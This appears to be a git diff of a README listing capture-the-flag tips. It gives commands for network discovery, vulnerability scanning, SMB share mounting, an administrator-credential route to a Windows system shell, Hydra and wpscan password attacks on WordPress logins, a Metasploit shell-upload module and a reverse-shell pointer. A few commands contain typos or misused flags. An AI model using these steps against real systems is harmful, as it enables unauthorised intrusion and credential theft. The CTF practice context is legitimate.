@@ -3,22 +3,33 @@
 > A currated list of all capture the flag tips and strategies.
 
 ## System Hacking
-* To discover the system in the network, use either Nmap or Netdiscover
-* To scan for vulnerabilities use nikto.
-  * Command to run : `nikto -h <HOST_IP>`
-* To scan for vulnerbilities we can use Nmap also.
+* To scan for systems and Open Services/Ports, Use Nmap
   * `namp -sV <HOST_IP>`
   * `nmap --script vuln <HOST_IP>`  -- Useful for getting Vulnerabilities on system
   * `nmap -sS -T4 -A -p- <HOST_IP>` -- Useful for All Ports, SYN Scan and OS detection
   * `nmap --script ssl-enum-ciphers -p 443  <HOST_IP>` -- Gives rating for SSL Ciphers
+* To passively discover machines on the network, Use Netdiscover
+  ```
+  root@kali:~# netdiscover -i eth0
+  Currently scanning: 192.168.17.0/16   |   Screen View: Unique Hosts                                                           3 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480                                                               _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+  -----------------------------------------------------------------------------
+  192.168.1.1     11:22:33:44:55:66      1      60  NETGEAR                                                                                           
+  192.168.1.2     21:22:33:44:55:66      1      60  Apple, Inc.                                                                                      
+  192.168.1.8     41:22:33:44:55:66      1      60  Intel Corporate                                                           
+  ```
+  
+* To scan for vulnerabilities use nikto.
+  * Command to run : `nikto -h <HOST_IP>`
+  
 * If port 80 is open, use robots.txt to find any hidden flags.
-* If Anonymous SMB is open, we can mount shares like this
+* If Anonymous SMB is open, we can mount shares.
   ```
   root@kali:~/CTF# mkdir /mnt/smb
-  root@kali:~/CTF# mount -t cifs //<HOST_IP>/Backups /mnt/smb/
-  Password for root@//<HOST_IP>/Backups: 
+  root@kali:~/CTF# mount -t cifs //<REMOTE_SMB_IP>/<SHARE> /mnt/smb/
+  Password for root@//<HOST_IP>/<SHARE>: 
   ```
-* If we found Administrator Creds, we can use this method to get root shell
+* If we found Administrator Credentials for SMB, Access the root shell using this method.
   ```
   root@kali:/opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
   [+] Finding open SMB ports....
@@ -46,6 +57,7 @@
 
   C:\Windows\system32>
   ```
+  
 * To view files on VHD drie, use `7z l <FILENAME>.vhd`
   ```
   root@kali:/mnt/smb# 7z l <VHD_NAME>.vhd
@@ -59,19 +71,18 @@
   ```
   root@kali:/mnt/smb# guestmount --add <VHD_NAME>.vhd --inspector -ro -v /mnt/vhd
   ```
-* If Webserver is running, we can find the Server version using
+* To Find server version of Webserver
   * `curl --header <SERVER_IP>`
-* If we want to find exploit of a particular version, use the command
+* If we want to find exploit of a particular version, Use searchsploit
   * `searchsploit apache 1.2.4`
 * If /wp-login.php is found in the Vulnerability scanning, it can be Wordpress site.
-* Use Burpsuite to see login data
-* Use Hydra to bruteforce username
+* Use Hydra to bruteforce username after capturing the login request using Burpsuite.
   * `hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username`
-* Use wpscan tool to scan Wordpress Website
+* To scan Wordpress Website for known vulnerabilities. 
   * `gem install wpscan`
   * `wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic`
 * We can use metasploit to exploit the server
-  * use exploit/unix/webapp/wp_admin_shell_upload -- Does not work
+  * use exploit/unix/webapp/wp_admin_shell_upload 
   * pentestmonkey.net/tools/web-shells/php-reverse-shell
 * Command to get Bash shell
   * `python -c "import pty;pty.spawn('/bin/bash')"`
